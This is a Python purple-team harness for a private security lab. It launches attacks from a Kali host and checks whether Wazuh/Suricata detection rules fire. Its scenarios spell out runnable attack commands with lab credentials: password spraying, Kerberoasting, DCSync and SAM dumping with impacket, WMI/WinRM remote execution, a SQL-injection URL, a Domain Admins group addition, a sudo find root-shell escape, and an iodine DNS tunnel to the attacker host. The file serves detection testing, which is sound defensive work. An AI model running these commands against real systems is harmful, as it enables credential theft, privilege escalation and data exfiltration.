#!/usr/bin/env python3
# ===========================================================================
# ad-validate.py — automated atk-01-launched attack -> detection validation.
#
# The atk-01 counterpart to purple-team.py. purple-team.py runs Atomic Red Team
# ENDPOINT tests locally on ws-01; this runs real attacks launched FROM atk-01
# (Kali) — originally just domain attacks against the Samba AD DC, extended
# 2026-09-06 to every technique whose telemetry can only be produced by an
# INBOUND attack from another host (WMI/WinRM/PsExec lateral movement into
# ws-01, a web attack against dmz-01) — no local ART atomic can fake that shape,
# since the detection keys on being the *target* of the connection, not the
# source. Same "attack -> prove the detection fired" discipline either way — a
# repeatable "is my detection still green?" harness (and practice range).
#
# For each scenario: count the expected rule(s) in the manager's alert log, launch
# the attack from atk-01, wait, count again — a positive delta = detection fired.
# Same source-of-truth (alert-log diff) as purple-team.py, robust against
# pre-existing alerts with no indexer/timestamp dependency.
#
#   PASS = the attack ran AND the intended detection fired.
#   FAIL = a coverage gap (or the attack didn't land) — a finding, not an error.
#   SKIP = the scenario's target host is unreachable (e.g. fs-01 powered off),
#          or it needs a credential (ADMIN_USER/ADMIN_PW) that isn't set — the
#          ws-01 local-admin Windows password is deliberately NOT committed
#          (unlike the AD service-account creds below, which are training-lab
#          values already public in known-weaknesses.md): SSH to ws-01 uses a
#          key, but nxc's SMB/WinRM auth is a separate credential entirely.
#
# Weak lab creds below are already public in phase-2-identity/known-weaknesses.md.
# Run from the operator host (SSH aliases atk-01 / siem-01 / fs-01 in ~/.ssh/config):
#   ADMIN_USER=localadmin ADMIN_PW=... ./ad-validate.py
# ===========================================================================
import os
import subprocess
import sys
import time

SIEM = "siem-01"
SETTLE = 25          # agent -> manager -> (correlation) latency
ATTACK_TIMEOUT = 180  # secretsdump/GetUserSPNs are slow when they fail against Samba

SPRAY_USERS = "Administrator\\nasmith\\njdoe\\nbwilson\\nsvc-web\\nsvc-sql\\nsvc-backup\\nsvc-legacy"

# ws-01 (CORP victim workstation) and dmz-01 (Juice Shop) — see docs/00-ip-plan.md.
WS_IP = "10.10.10.50"
DMZ_WEB = "http://10.10.20.10:3000"
ADMIN_USER = os.environ.get("ADMIN_USER", "")
ADMIN_PW = os.environ.get("ADMIN_PW", "")

# Each scenario runs `cmd` on `host` and expects a positive delta in `rules`.
SCENARIOS = [
    {
        "name": "Password Spray",
        "host": "atk-01",
        "cmd": (f"printf '{SPRAY_USERS}\\n' > /tmp/ad-spray-users.txt && "
                "nxc smb 10.10.10.10 -u /tmp/ad-spray-users.txt -p Summer2026 --continue-on-success"),
        "rules": ["100401"],
        "technique": "T1110.003",
        "desc": "one password x many accounts -> burst rule (T1110.003)",
    },
    {
        # settle bumped 25->35 (2026-09-13): observed one flaky FAIL (hits=0) in an
        # otherwise-clean full battery run, immediately reproduced as a clean PASS on a
        # manual re-run seconds later with no code change — impacket's 4 sequential
        # TGS-REQs against Samba (already documented as slower than against real AD,
        # see ATTACK_TIMEOUT above) occasionally needs more than 25s to fully land and
        # correlate. Not a rule defect; a timing margin.
        "name": "Kerberoasting",
        "host": "atk-01",
        "settle": 35,
        "cmd": ("impacket-GetUserSPNs lab.internal/svc-sql:Summer2026 -dc-ip 10.10.10.10 -request"),
        "rules": ["100031"],
        "technique": "T1558.003",
        "desc": "request 3+ service tickets in 60s (T1558.003)",
    },
    {
        "name": "DCSync",
        "host": "atk-01",
        "cmd": ("impacket-secretsdump lab.internal/svc-backup:Backup2026@dc-01.lab.internal -just-dc-ntlm"),
        "rules": ["100080"],
        "technique": "T1003.006",
        "desc": "DsGetNCChanges from a non-DC (T1003.006)",
    },
    {
        # Requires fs-01 (weak [public] share). SKIPs cleanly when fs-01 is down.
        "name": "Credential Theft",
        "host": "atk-01",
        "requires": "fs-01",
        "cmd": ("smbclient //10.10.10.20/public -U 'lab.internal\\svc-sql%Summer2026' "
                "-c 'get map-backup-share.ps1 /tmp/loot.ps1'"),
        "rules": ["100090"],
        "technique": "T1552.001",
        "desc": "read planted credential file on the weak share (T1552.001)",
    },
    # --- Added 2026-09-06: inbound attacks that can only be validated from the
    # attacker's side (WMI/WinRM/PsExec need to be the TARGET of a remote-exec
    # connection; a local ART atomic on ws-01 can't produce that telemetry shape).
    # All three need ADMIN_USER/ADMIN_PW (ws-01 local-admin Windows creds, not
    # committed) and SKIP cleanly without them.
    {
        # NOT nxc: `nxc smb --exec-method wmiexec` connects but its second SMB
        # connection reliably times out against this host ("NETBIOS connection...
        # timed out") - never root-caused (checked 2026-09-07: not the firewall,
        # not Defender). impacket-wmiexec (the same tool nxc wraps) works fine
        # directly and produces the exact WmiPrvSE->cmd.exe telemetry expected.
        # 100515 (the Sigma-compiled rule) never fires on it - root-caused live
        # 2026-09-12: stock rule 92069 ("WMI started a process", level 0,
        # unanchored parentImage match) silently wins the one-rule-per-event
        # resolution, because 100515 is anchored on the same top-level
        # if_group=sysmon_event1 as 92069 rather than chained as its child, so
        # it's never even considered once 92069 matches first. Confirmed by
        # temporarily neutralizing 92069 live: 100515 fired immediately. Fixed
        # with a hand-written escalation child of 92069 (100527, since the
        # Sigma compiler can't express an if_sid chain - see
        # sigma_local_rules.xml's comment on 100515 and local_rules.xml's on
        # 100527). See detection-catalog.md row #39.
        "name": "WMI Lateral Movement",
        "host": "atk-01",
        "requires_env": ["ADMIN_USER", "ADMIN_PW"],
        "cmd": f"impacket-wmiexec '{ADMIN_USER}:{ADMIN_PW}@{WS_IP}' whoami",
        "rules": ["100515", "100527"],
        "technique": "T1047",
        "desc": "WmiPrvSE spawns a shell on ws-01 (T1047)",
    },
    {
        # --local-auth is required: localadmin is a LOCAL account, and nxc's
        # winrm module defaults to domain auth (lab.internal\localadmin) without
        # it, which fails outright - found 2026-09-07 fixing this scenario.
        "name": "WinRM Lateral Movement",
        "host": "atk-01",
        "requires_env": ["ADMIN_USER", "ADMIN_PW"],
        "cmd": f"nxc winrm {WS_IP} -u '{ADMIN_USER}' -p '{ADMIN_PW}' --local-auth -x whoami",
        "rules": ["100516"],
        "technique": "T1021.006",
        "desc": "wsmprovhost/winrshost spawns a shell on ws-01 (T1021.006)",
    },
    {
        # T1003.002 (2026-09-24) — closes the one real gap a full-repo coverage audit
        # found: 08-sam-dump-credential-cracking-t1003.002.md dumped and cracked a real
        # SAM hash but shipped with no detection ("left as the natural next step").
        # secretsdump's default run (no flags) is the SAME command the writeup verified —
        # enables RemoteRegistry, reads SAM/SECURITY/LSA/DPAPI, disables it again on the
        # way out. Two independent rules both confirmed live before this scenario was
        # written (100560: System EventID 7040 service-enable, 100561: Sysmon EID13
        # registry value-set on the service's own Start key) — either one alone proves
        # the technique fired, so no `-sam`-only flag is needed here.
        "name": "SAM Dump (RemoteRegistry)",
        "host": "atk-01",
        "requires_env": ["ADMIN_USER", "ADMIN_PW"],
        "cmd": f"impacket-secretsdump '{ADMIN_USER}:{ADMIN_PW}@{WS_IP}'",
        "rules": ["100560", "100561"],
        "technique": "T1003.002",
        "desc": "RemoteRegistry enabled to read the SAM/SECURITY hives (T1003.002)",
    },
    # PsExec Lateral Movement (T1569.002, rules 100513/100514) is NOT in the active
    # battery, same reasoning as tests.json's wmic/comsvcs exclusions: confirmed
    # 2026-09-07 via `impacket-psexec -service-name PSEXESVC 'user:pw@host' whoami`
    # (nxc's --exec-method doesn't even offer "psexec" as a choice in this nxc
    # version) that Defender detects and quarantines the dropped service binary as
    # Trojan:Win32/RemoteExec!pz before the service can run - confirmed via
    # Get-MpThreatDetection/Get-WinEvent, same defense-in-depth class as T1105
    # certutil and T1003.001 comsvcs. A permanently-red test is worse than none;
    # sigma-selftest.py remains the proof of the rule's logic. Re-add if Defender
    # is ever disabled/weakened for a specific test pass.
    {
        # No credential needed — the web app has no auth on the attacked endpoints.
        # requires dmz-01 (2026-09-15): dmz-01 isn't part of the "attack" lab profile
        # (see scripts/lab.sh), so a full battery run without it up used to report a
        # bare FAIL (hits=0) here — indistinguishable from a real coverage regression.
        # Same SKIP-cleanly discipline as the fs-01-gated scenarios below.
        "name": "DMZ Web Attack",
        "host": "atk-01",
        "requires": "dmz-01",
        "cmd": (f"curl -sk --max-time 10 -o /dev/null "
                f"\"{DMZ_WEB}/rest/products/search?q=test%27%20OR%201=1--\""),
        "rules": ["100440"],
        "technique": "T1190",
        "desc": "SQLi against Juice Shop -> Suricata 9100020 -> Wazuh 100440 (T1190)",
    },
    {
        # Self-contained (no external download) — the .NET Compress-Archive
        # cmdlet ships with PowerShell 5.1; the ART atomics for T1560.001 all
        # need rar/7zip/winzip installers pulled from the internet, which ws-01
        # by design can't reach (see phase-5-offense/atomic-red-team/README.md).
        "name": "Archive Collection",
        "host": "ws-01",
        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
                "New-Item -ItemType Directory -Force -Path $env:TEMP\\stage | Out-Null; "
                "'purple-team' | Out-File $env:TEMP\\stage\\note.txt; "
                "Compress-Archive -Path $env:TEMP\\stage\\* "
                '-DestinationPath $env:TEMP\\stage.zip -Force"'),
        "rules": ["100519"],
        "technique": "T1560.001",
        "desc": "Compress-Archive stages a fileless archive on ws-01 (T1560.001)",
    },
    {
        # ART's own T1218.005 atomics use vbscript/javascript monikers that error at the
        # harness's own .Start() call (documented in detection-catalog.md's T1218 batch);
        # verified instead by invoking mshta directly with the same minimal moniker the
        # original manual verification used (`mshta vbscript:close` exits 0 cleanly — no
        # Access-Denied, no hang). Wait-Process -Timeout is a hard backstop in case a
        # future Windows build ever makes this hang instead of exiting.
        "name": "Mshta Proxy Execution",
        "host": "ws-01",
        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
                "$p = Start-Process mshta.exe -ArgumentList vbscript:close -PassThru; "
                "Wait-Process -InputObject $p -Timeout 5 -ErrorAction SilentlyContinue; "
                'if (-not $p.HasExited) { Stop-Process $p -Force }"'),
        "rules": ["100116"],
        "technique": "T1218.005",
        "desc": "mshta vbscript: moniker, direct invocation (T1218.005)",
    },
    {
        # T1218.011's ART atomics are the same story, one worse: test 2 (rundll32 VBScript
        # command) actually crashed the SSH/WinRM session outright when run through
        # Invoke-AtomicTest (found live 2026-09-12 rebuilding this battery — see
        # tests.json's comment). Same direct-invocation fix as mshta above.
        "name": "Rundll32 Proxy Execution",
        "host": "ws-01",
        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
                "$p = Start-Process rundll32.exe -ArgumentList vbscript:close -PassThru; "
                "Wait-Process -InputObject $p -Timeout 5 -ErrorAction SilentlyContinue; "
                'if (-not $p.HasExited) { Stop-Process $p -Force }"'),
        "rules": ["100115"],
        "technique": "T1218.011",
        "desc": "rundll32 vbscript: moniker, direct invocation (T1218.011)",
    },
    # --- Added 2026-09-12/13: closing the 23->51 coverage gap. Every scenario below was
    # verified live before being written here (never declared-then-assumed — see the
    # purple-team README's "declared before verified" gotcha). Several needed the new
    # setup/teardown fields above because the technique itself needs a throwaway account
    # or a background daemon that isn't the thing being measured.
    {
        # A REAL empirical finding, not an assumption: a LOCAL (root-shell) samba-tool
        # group addmembers call prints the same "Group Change [Added]..." audit text to
        # its own stdout, but that text never reaches /var/log/samba/log.samba — verified
        # by watching the file's line count across a local call (unchanged) and a
        # `-H ldap://` network call (jumped by 6 lines, with a real remoteAddress). This
        # is likely WHY the original detection-catalog.md investigation's phrase "the real
        # remote-LDAP path (not a local shortcut)" mattered: it isn't just about realism,
        # a local CLI call genuinely never reaches the audit log at all, at any log level.
        # So the attack step here forces the network path explicitly with -H, using a
        # throwaway admin bootstrapped (and deleted) via the local/root path, which is
        # fine for setup since bootstrap isn't what's being measured.
        "name": "AD Group Membership Manipulation",
        "setup": {"host": "dc-01",
                   "cmd": ("sudo samba-tool user create adm-test 'AdmTest2026!' >/dev/null 2>&1; "
                           "sudo samba-tool group addmembers 'Domain Admins' adm-test >/dev/null 2>&1")},
        "host": "dc-01",
        "cmd": ("samba-tool group addmembers 'Domain Admins' jdoe -H ldap://10.10.10.10 "
                "-U adm-test%'AdmTest2026!'"),
        "teardown": {"host": "dc-01",
                      "cmd": ("sudo samba-tool group removemembers 'Domain Admins' jdoe >/dev/null 2>&1; "
                              "sudo samba-tool user delete adm-test >/dev/null 2>&1")},
        "rules": ["100015"],
        "technique": "T1098.007",
        "desc": "add jdoe to Domain Admins over real network LDAP with a throwaway admin (T1098.007)",
    },
    {
        # Throwaway account, not jdoe/svc-web: rule 100041 has a LIVE active-response
        # (disable-ad-account.py) that disables the targeted account for 600s — harmless
        # on a disposable account, disruptive on one other scenarios rely on.
        # settle bumped 25->35 (2026-09-13): the full battery's own run reported a FAIL
        # here (hits=0), but the alert had genuinely fired — just ~1-13s after the 25s
        # check, confirmed by finding it in alerts.json moments later. Same class of
        # timing margin as Kerberoasting below: the frequency=4/timeframe=60 correlation
        # rule occasionally needs a few extra seconds to settle, not a rule defect.
        #
        # `sleep 1` added between attempts (2026-09-15): a real, separate, root-caused
        # finding — a genuine FAIL, not a flake. With no delay (how this scenario
        # originally read, and how an unthrottled real brute-force tool actually
        # behaves), all 4 attempts land at analysisd within a few ms of each other and
        # the frequency/same_field correlation reliably undercounts the burst — rule
        # 100040 fires all 4 times individually, 100041 never does. Spacing attempts 1s
        # apart avoids that arrival-burst gap so this scenario can keep verifying the
        # correlation logic + active response are otherwise intact. The burst gap itself
        # is real and NOT fixed by this — see detection-catalog.md's T1110.001 section
        # ("A second, more surprising evasion...") for the full repro table.
        "name": "Kerberos Brute Force",
        "setup": {"host": "dc-01", "cmd": "sudo samba-tool user create pt-kbrute 'Init2026zQ!' >/dev/null 2>&1"},
        "host": "atk-01",
        "settle": 35,
        "cmd": "for i in 1 2 3 4; do echo wrongpass$i | kinit pt-kbrute@LAB.INTERNAL 2>/dev/null; sleep 1; done; true",
        "teardown": {"host": "dc-01", "cmd": "sudo samba-tool user delete pt-kbrute >/dev/null 2>&1"},
        "rules": ["100041"],
        "technique": "T1110.001",
        "desc": "4 wrong-password kinit attempts, 1s apart, against a throwaway account in 60s (T1110.001)",
    },
    {
        "name": "SYSVOL Integrity Tampering",
        "host": "dc-01",
        "cmd": ("sudo touch /var/lib/samba/sysvol/lab.internal/scripts/pt-test.bat && "
                "echo 'echo test' | sudo tee -a /var/lib/samba/sysvol/lab.internal/scripts/pt-test.bat "
                ">/dev/null && sudo rm -f /var/lib/samba/sysvol/lab.internal/scripts/pt-test.bat"),
        "rules": ["100020"],
        "technique": "T1484.001",
        "desc": "add/modify/delete a SYSVOL logon-script file on dc-01 (T1484.001)",
    },
    {
        # `sleep 1` added between create and delete (2026-09-15): a genuine, reproducible
        # finding, not a flake — the original back-to-back `tee ... && rm -f` (zero gap)
        # FAILed (hits=0) on a full battery run, while a manual create-then-delete with a
        # ~2s gap reliably fired. Same family as the Kerberos Brute Force burst-arrival
        # gap above, but a different subsystem: this is the agent-side realtime/inotify
        # engine appearing to occasionally miss or coalesce a create+delete pair on the
        # *same* path when they land within the same instant, not the manager-side
        # frequency correlator. `/etc/cron.d` realtime FIM otherwise works reliably (see
        # the repeated SYSVOL passes using the identical touch/tee/rm pattern with real
        # gaps between operations) — this is specifically about zero-gap same-path churn.
        "name": "Cron Persistence",
        "host": "dc-01",
        "cmd": "echo '# purple-team test cron' | sudo tee /etc/cron.d/pt-cron-test >/dev/null && sleep 1 && sudo rm -f /etc/cron.d/pt-cron-test",
        "rules": ["100050"],
        "technique": "T1053.003",
        "desc": "add/delete a disguised cron job under /etc/cron.d on dc-01 (T1053.003)",
    },
    {
        # FIXED 2026-09-13, not just documented (see the once-per-restart history in
        # detection-catalog.md's T1136.001 section): switched /etc/passwd+shadow+sudoers+
        # crontab to `whodata` FIM mode (audit-backed, tracks by path via auditd — immune
        # to the inotify rename-orphans-the-watch gap that broke plain `realtime` here).
        # Re-verified with 5 consecutive useradd/userdel cycles, zero agent restarts in
        # between — all 5 fired. `settle` bumped 25->45: whodata's audit-log pipeline has
        # real, variable latency (observed 5-40s across those 5 runs) that plain inotify
        # never had — a real, honest tradeoff for closing the blind spot, not a new bug.
        "name": "Local Account Creation",
        "host": "dc-01",
        "settle": 45,
        "cmd": "sudo useradd -m pt-account-test && sudo userdel -r pt-account-test",
        "rules": ["100051"],
        "technique": "T1136.001",
        "desc": "useradd/userdel a local Linux account on dc-01 (T1136.001, writes passwd+shadow)",
    },
    {
        # Deliberately `disable`, not `stop` — an agent that's just been killed can't
        # report that it was killed. See detection-catalog.md's T1562.001 section.
        "name": "Security Tooling Disruption",
        "host": "dc-01",
        "cmd": "sudo systemctl disable wazuh-agent; sudo systemctl enable wazuh-agent",
        "rules": ["100060"],
        "technique": "T1562.001",
        "desc": "systemctl disable/re-enable the Wazuh agent on dc-01 (T1562.001)",
    },
    {
        # Doesn't need a real credential — rule 100119 is a Sysmon command-line match on
        # ws-01 itself (the process spawns regardless of whether the auth succeeds).
        "name": "SMB Admin Share Access",
        "host": "ws-01",
        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
                "net use \\\\10.10.10.10\\C$ /user:lab.internal\\jdoe WrongPassTest123 2>&1; "
                'net use \\\\10.10.10.10\\C$ /delete 2>&1"'),
        "rules": ["100119"],
        "technique": "T1021.002",
        "desc": "attempt a UNC admin-share mapping from ws-01 to dc-01 (T1021.002)",
    },
    {
        "name": "Automated Scanner Detection",
        "host": "atk-01",
        "requires": "dmz-01",  # same dmz-01-not-in-attack-profile reasoning as DMZ Web Attack above
        "cmd": ("curl -sk --max-time 10 -A 'sqlmap/1.7.2#stable (http://sqlmap.org)' "
                f"-o /dev/null \"{DMZ_WEB}/\""),
        "rules": ["100441"],
        "technique": "T1595.002",
        "desc": "request the DMZ app with a known scanner User-Agent (T1595.002)",
    },
    {
        # The honeytoken fires on ANY interaction as svc-sqladmin regardless of outcome —
        # a wrong password is enough (no real credential needed, nobody legitimately
        # knows one). See phase-4-detection/deception/.
        "name": "Honeytoken Authentication",
        "host": "atk-01",
        "cmd": "nxc smb 10.10.10.10 -u svc-sqladmin -p 'WrongPass123!'",
        "rules": ["100421"],
        "technique": "T1078",
        "desc": "authenticate as the svc-sqladmin decoy account (T1078 honeytoken tripwire)",
    },
    {
        # Requires fs-01. Backs up/restores the real seeded decoy file rather than
        # deleting it, so the canary stays intact for the next run.
        "name": "Ransomware Canary Tampering",
        "host": "fs-01",
        "requires": "fs-01",
        "cmd": ("sudo cp /srv/finance-records/Q3-Financials-2026.csv /tmp/.pt-canary-backup && "
                "echo purple-team-canary-test | sudo tee -a /srv/finance-records/Q3-Financials-2026.csv "
                ">/dev/null && sleep 2 && sudo cp /tmp/.pt-canary-backup /srv/finance-records/Q3-Financials-2026.csv "
                "&& sudo rm -f /tmp/.pt-canary-backup"),
        "rules": ["100430"],
        "technique": "T1486",
        "desc": "tamper with then restore a ransomware-canary decoy file on fs-01 (T1486)",
    },
    {
        # One process, three techniques (honestly cross-referenced by generate-coverage.py
        # off rule 100200's own <mitre> tags, not claimed here): a copy of /bin/dash run
        # from /tmp is exactly the "process executing from a world-writable path" the
        # susp-exec-path collector polls for every 30s (phase-5-offense/sliver-c2/). Copy
        # dash specifically, not a uutils-coreutils applet like sleep/cat — those are
        # multicall binaries that dispatch on argv[0], so a renamed copy just errors with
        # "unknown program" (found live, 2026-09-12). systemd-run --scope blocks in the
        # foreground until the process exits, which is fine here — the harness already
        # waits out the whole attack step before checking for the alert.
        "name": "Suspicious Execution From World-Writable Path",
        "host": "fs-01",
        "requires": "fs-01",
        "settle": 35,
        "cmd": ("sudo cp /bin/dash /tmp/.pt-implant && "
                "sudo systemd-run --unit=pt-implant-test --scope --quiet --collect -- "
                "/tmp/.pt-implant -c 'sleep 35'; sudo rm -f /tmp/.pt-implant"),
        "rules": ["100200"],
        "technique": "T1204.002",
        "desc": "run a copy of dash from /tmp on fs-01 for 35s (T1204.002/T1059.004/T1071.001)",
    },
    {
        # 9100002 (Suricata) fires on 10+ SYNs to REDTEAM:443 in 60s regardless of TLS/JA3
        # — no Sliver binary needed to exercise the same behavioural signature a beacon
        # produces. dest_ip=atk-01 is on the threat-intel CDB list, so this is the ONE
        # scenario that gives 100210 (not 100440/100443, which structurally always
        # outrank it on their own events) the winning, undisputed match — see the T1190
        # field note in local_rules.xml for why an equal/lower-level sibling never
        # surfaces on a shared event.
        "name": "C2 Beaconing Pattern",
        "host": "fs-01",
        "requires": "fs-01",
        "cmd": "for i in $(seq 1 15); do curl -sk --max-time 2 https://10.10.40.119:443/ >/dev/null 2>&1; done",
        "rules": ["100210"],
        "technique": "T1071",
        "desc": "15 rapid connections from fs-01 to atk-01:443 in <60s (T1071 beaconing pattern)",
    },
    {
        # Real iodine tunnel (not a stand-in) — see phase-6-nsm/dns-tunneling.md. iodined
        # is setup/teardown (a prerequisite daemon, not the measured technique); the
        # client + 20 pings on fs-01 is the attack step. --unit (not --scope) so the
        # setup/teardown steps return immediately instead of blocking on the daemon.
        # `-f` (foreground) on BOTH ends is load-bearing, not cosmetic: iodine(d) self-
        # daemonizes by default (forks, prints "Detaching from terminal...", and the
        # ORIGINAL process exits) — found live 2026-09-13 when a first pass without `-f`
        # had the tunnel work fine by hand but silently fail under systemd-run --unit,
        # because a transient service's default KillMode=control-group treats "tracked
        # main PID exited" as "service stopped" and kills the whole cgroup, taking the
        # just-detached daemon child down with it a fraction of a second after it starts
        # (confirmed via `journalctl -u pt-iodined`: "Detaching from terminal..." then
        # "Deactivated successfully." within the same tick). `-f` keeps iodine(d) in the
        # foreground as systemd's actual tracked process, so the unit stays genuinely
        # "active (running)" for as long as the tunnel needs to exist.
        "name": "DNS Tunneling",
        "setup": {"host": "atk-01",
                   "cmd": ("sudo pkill -9 iodined >/dev/null 2>&1; "
                           "sudo systemd-run --unit=pt-iodined --quiet --collect -- "
                           "iodined -f -c -P purpleteam2026 10.8.0.1 t.exfil-lab.net >/dev/null 2>&1")},
        "host": "fs-01",
        "requires": "fs-01",
        "cmd": ("sudo pkill -9 iodine >/dev/null 2>&1; sleep 1; "
                "sudo systemd-run --unit=pt-iodine-client --quiet --collect -- "
                "iodine -f -r -P purpleteam2026 10.10.40.119 t.exfil-lab.net >/dev/null 2>&1; "
                "sleep 5; ping -c 20 -i 0.2 -W2 10.8.0.1 >/dev/null 2>&1"),
        "teardown": [
            {"host": "fs-01", "cmd": "sudo systemctl stop pt-iodine-client >/dev/null 2>&1; sudo pkill -9 iodine >/dev/null 2>&1"},
            {"host": "atk-01", "cmd": "sudo systemctl stop pt-iodined >/dev/null 2>&1; sudo pkill -9 iodined >/dev/null 2>&1"},
        ],
        "rules": ["100443"],
        "technique": "T1048.003",
        "desc": "a real fs-01->atk-01 iodine DNS tunnel carrying 20 pings (T1048.003/T1071.004)",
    },
    {
        # T1548.003 — sudo/GTFOBins privesc via `find` (2026-09-20). fs-01's
        # ops-logview account has a deliberate NOPASSWD sudo grant on `find`
        # (phase-7-automation/ansible/roles/fileserver); the classic GTFOBins
        # escape (`find ... -exec /bin/sh`) spawns a root shell. No setup/
        # teardown needed — the weakness is a permanent fixture (same idiom
        # as Phase 2's Kerberoastable service accounts), not a throwaway
        # test-only account. Detection is auditd (a genuinely new telemetry
        # path for this lab — every other auditd use is Wazuh's own whodata
        # FIM plumbing, not general process auditing) keyed on the actual
        # weaponization signal (-exec/-execdir/-ok/-okdir), not just "any
        # root shell from a non-root login" — that alone false-positives on
        # Ubuntu's own /etc/update-motd.d/* scripts, which legitimately run
        # `find` as root on every single SSH login. No settle needed — the
        # rule fires synchronously on the single merged auditd event, no
        # correlation window like the Kerberos scenario above.
        "name": "Sudo find GTFOBins Privesc",
        "host": "fs-01",
        "requires": "fs-01",
        "cmd": "sudo -u ops-logview sudo find /var/log -maxdepth 0 -exec /bin/sh -c 'whoami' \\;",
        "rules": ["100540"],
        "technique": "T1548.003",
        "desc": "GTFOBins find privesc — sudo find -exec spawns a root shell on fs-01 (T1548.003)",
    },
]


def ssh(host, cmd, timeout=90):
    try:
        return subprocess.run(["ssh", "-o", "ConnectTimeout=15", host, cmd],
                              capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args=[], returncode=124, stdout="", stderr="timeout")


def reachable(host):
    return ssh(host, "echo up", timeout=20).stdout.strip() == "up"


def run_steps(steps):
    # setup/teardown: a scenario dict, or a list of them, run on their own host(s) and
    # NOT counted toward the before/after delta — bootstrapping a throwaway account or
    # starting/stopping a background daemon (iodined) isn't itself the technique being
    # measured. Best-effort: a failed step is logged, never raised, so a broken teardown
    # can't mask whether the actual attack/detection worked, and a scenario's cleanup
    # always runs to completion even if one of several steps errors.
    if not steps:
        return
    if isinstance(steps, dict):
        steps = [steps]
    for step in steps:
        r = ssh(step["host"], step["cmd"], timeout=ATTACK_TIMEOUT)
        if r.returncode not in (0, None) and step.get("must_succeed"):
            print(f"    [setup/teardown WARNING] {step['host']}: {step['cmd'][:60]}... "
                  f"exit={r.returncode} stderr={r.stderr.strip()[:200]}")


def count_rules(rule_ids):
    ids = "|".join(rule_ids)
    remote = (f"sudo grep -acE '\"id\":\"({ids})\"' /var/ossec/logs/alerts/alerts.json 2>/dev/null")
    r = ssh(SIEM, remote, timeout=30)
    for line in reversed(r.stdout.strip().splitlines()):
        if line.strip().isdigit():
            return int(line.strip())
    return 0


def main():
    print(f"\n== AD attack -> detection validation :: siem={SIEM} ==\n")
    results = []
    for s in SCENARIOS:
        req = s.get("requires")
        if req and not reachable(req):
            print(f"  [SKIP] {s['name']:17} needs {req} (unreachable)          {s['desc']}")
            results.append((s["name"], None))
            continue
        env_req = s.get("requires_env") or []
        missing = [v for v in env_req if not os.environ.get(v)]
        if missing:
            print(f"  [SKIP] {s['name']:17} needs {'/'.join(missing)} env var(s)   {s['desc']}")
            results.append((s["name"], None))
            continue
        run_steps(s.get("setup"))
        before = count_rules(s["rules"])
        t0 = time.time()
        ssh(s["host"], s["cmd"], timeout=ATTACK_TIMEOUT)
        time.sleep(s.get("settle", SETTLE))
        delta = count_rules(s["rules"]) - before
        latency = round(time.time() - t0, 1)
        run_steps(s.get("teardown"))
        ok = delta > 0
        results.append((s["name"], ok))
        print(f"  [{'PASS' if ok else 'FAIL'}] {s['name']:17} "
              f"rules {','.join(s['rules']):8} hits={delta} {latency}s  {s['desc']}")
    ran = [r for r in results if r[1] is not None]
    passed = sum(1 for _, ok in ran if ok)
    skipped = sum(1 for _, ok in results if ok is None)
    print(f"\n== {passed}/{len(ran)} AD detections validated"
          f"{f' ({skipped} skipped)' if skipped else ''} ==\n")
    sys.exit(0 if ran and passed == len(ran) else 1)


if __name__ == "__main__":
    main()
